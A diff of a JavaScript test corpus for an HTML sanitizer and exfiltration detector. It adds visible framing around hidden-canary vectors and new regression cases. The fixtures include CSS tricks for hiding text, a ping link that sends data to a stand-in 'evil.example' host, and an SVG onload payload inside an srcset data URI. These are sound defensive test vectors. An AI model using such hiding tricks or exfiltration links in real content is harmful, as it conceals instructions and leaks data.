@@ -20,7 +20,14 @@ import assert from "node:assert/strict";
 import { sanitizeHtml, detectExfil, checkExfilUrl } from "../src/html.mjs";
 
 const CANARY = "CANARY_d41d8c";
-const hidden = (decl) => `<div style="${decl}">${CANARY}</div>`;
+// Visible framing bytes on either side of the hidden element (T9): a splice must
+// remove the canary WITHOUT touching the surrounding visible text. Kept on their
+// own paragraphs (blank lines) so the `<div>` stays a flow HTML block — the same
+// parse path the bare vectors originally exercised — while still being framed.
+const FRAME_L = "framingLeftVISIBLE";
+const FRAME_R = "framingRightVISIBLE";
+const hidden = (decl) =>
+  `${FRAME_L}\n\n<div style="${decl}">${CANARY}</div>\n\n${FRAME_R}`;
 const NEEDLE = "q9X2mN7pK4rT8wY1cV5bZ3dF6gH0jL2e";
 // RFC 4648 §5 url-safe base64 (`-`/`_` for `+`/`/`) carrying a contiguous 40+
 // alnum run — a payload that dodges the standard `[A-Za-z0-9+/]` blob arms.
@@ -31,9 +38,12 @@ const CORPUS = {
     { name: "display-none", input: hidden("display:none") },
     {
       name: "visibility-hidden",
-      input: `<span style="visibility:hidden">${CANARY}</span>`,
+      input: `${FRAME_L}\n\n<span style="visibility:hidden">${CANARY}</span>\n\n${FRAME_R}`,
     },
-    { name: "opacity-zero", input: `<p style="opacity:0">${CANARY}</p>` },
+    {
+      name: "opacity-zero",
+      input: `${FRAME_L}\n\n<p style="opacity:0">${CANARY}</p>\n\n${FRAME_R}`,
+    },
     { name: "offscreen-left", input: hidden("position:absolute;left:-9999px") },
     { name: "offscreen-top", input: hidden("position:fixed;top:-10000px") },
     {
@@ -99,11 +109,18 @@ const CORPUS = {
       input: hidden("color:#FFFFFF;background-color:rgb(255, 255, 255)"),
     },
     {
-      name: "black-on-black-shorthand",
-      input: hidden("color:#000;background:rgb(0,0,0) url(x)"),
+      name: "white-on-white-hsl",
+      input: hidden("color:hsl(0 0% 100%);background-color:white"),
     },
-    { name: "html-comment", input: `text<!-- ${CANARY} -->OK` },
-    { name: "bare-hidden-attr", input: `<div hidden>${CANARY}</div>` },
+    {
+      name: "html-comment",
+      input: `text<!-- ${CANARY} -->OK`,
+      keep: ["text", "OK"],
+    },
+    {
+      name: "bare-hidden-attr",
+      input: `${FRAME_L}\n\n<div hidden>${CANARY}</div>\n\n${FRAME_R}`,
+    },
     {
       // A malformed sibling declaration (`x`, no colon) must not blank
       // detection of the valid `display:none` next to it — a browser
@@ -119,14 +136,17 @@ const CORPUS = {
     {
       name: "hidden-span-in-heading",
       input: `# Title <span style="display:none">${CANARY}</span> end`,
+      keep: ["Title", "end"],
     },
     {
       name: "hidden-span-in-list-item",
       input: `- item <span hidden>${CANARY}</span> tail`,
+      keep: ["item", "tail"],
     },
     {
       name: "hidden-div-in-blockquote",
-      input: `> <div hidden>${CANARY}</div>\n> visible`,
+      input: `> visible-before\n> <div hidden>${CANARY}</div>\n> visible-after`,
+      keep: ["visible-before", "visible-after"],
     },
   ],
   reported: [
@@ -228,6 +248,15 @@ const CORPUS = {
       input: `<a href="/ok" ping="https://evil.example/t?exfil=${"A".repeat(44)}">x</a>`,
       reason: "suspicious query parameter",
       isImage: false,
+    },
+    {
+      // H6: a srcset candidate URL that itself contains commas (a data: URI)
+      // must survive candidate splitting intact. A naive split(",") shredded it
+      // into `data:image/svg+xml` + junk and missed the active-content payload.
+      name: "srcset-data-uri-with-comma",
+      input: `<img srcset="data:image/svg+xml,<svg/onload=x> 2x">`,
+      reason: "active-content data: URI",
+      isImage: true,
     },
   ],
   url: [
@@ -366,6 +395,21 @@ const CORPUS = {
     { name: "keyword-session-ok", input: "https://e.com/p?session=ok" },
     { name: "keyword-cursor-abc", input: "https://e.com/p?cursor=abc" },
     { name: "keyword-auth-ok", input: "https://e.com/p?auth=ok" },
+    {
+      // H4: a benign path-like value whose "authorization" keyword and 20-char
+      // run sit in DIFFERENT places must not read as a credential — the secret
+      // shape has to match on the same contiguous opaque run.
+      name: "authorization-redirect-path",
+      input:
+        "https://ok.example/callback?redirect=/authorization-service/session/abcdefghij1234567890",
+    },
+    {
+      // A prose value containing the word "token" split by hyphens is not a
+      // contiguous opaque credential run.
+      name: "token-word-in-prose-path",
+      input:
+        "https://ok.example/p?next=/reset-token-flow/step-2/confirmation-page-1234",
+    },
     { name: "small-data-image", input: "data:image/png;base64,iVBORw0KGgo=" },
     {
       name: "signed-cdn-link",
@@ -435,6 +479,39 @@ const CORPUS = {
       name: "small-negative-left",
       input: hidden("position:absolute;left:-5px"),
     },
+    // ── precision regressions for findings H1–H3 (must NOT splice) ──
+    {
+      // H3: a flat background color under a url() IMAGE layer is not provably
+      // the rendered backdrop — the image can paint over same-colored text.
+      name: "same-color-over-bg-image",
+      input: hidden("color:#000;background:rgb(0,0,0) url(dark.png)"),
+    },
+    {
+      name: "white-on-white-over-gradient",
+      input: hidden("color:#fff;background:#fff linear-gradient(#fff,#000)"),
+    },
+    {
+      // H1: gradient-clipped heading — transparent color, but the gradient is
+      // painted through the glyphs via background-clip:text.
+      name: "gradient-clipped-heading",
+      input: hidden(
+        "color:transparent;background:linear-gradient(90deg,#f00,#00f);-webkit-background-clip:text;background-clip:text",
+      ),
+    },
+    {
+      // H1: -webkit-text-fill-color overrides transparent `color` for the fill.
+      name: "text-fill-color-visible",
+      input: hidden("color:transparent;-webkit-text-fill-color:#111"),
+    },
+    {
+      // H2: only the top half is clipped — the bottom stays on screen.
+      name: "clip-path-inset-top-half",
+      input: hidden("clip-path:inset(50% 0 0 0)"),
+    },
+    {
+      name: "clip-path-inset-one-open-edge",
+      input: hidden("clip-path:inset(50% 50% 50% 10%)"),
+    },
     {
       name: "half-shift-vw",
       input: hidden("position:absolute;left:-50vw"),
@@ -503,10 +580,18 @@ const CORPUS = {
 };
 
 describe("corpus: hidden content never survives sanitizeHtml", () => {
-  for (const { name, input } of CORPUS.hidden) {
+  for (const { name, input, keep } of CORPUS.hidden) {
     it(`removes ${name}`, () => {
       const out = sanitizeHtml(input)?.text ?? input;
       assert.equal(out.includes(CANARY), false, `survived: ${name}`);
+      // The splice must be surgical: adjacent visible framing bytes survive
+      // byte-for-byte (T9). `keep` names them for custom vectors; the rest use
+      // the FRAME_L/FRAME_R sentinels the `hidden()` helper wraps around.
+      const framing =
+        keep ?? [FRAME_L, FRAME_R].filter((m) => input.includes(m));
+      assert.ok(framing.length > 0, `no framing asserted for ${name}`);
+      for (const marker of framing)
+        assert.ok(out.includes(marker), `framing "${marker}" lost in ${name}`);
     });
   }
 });
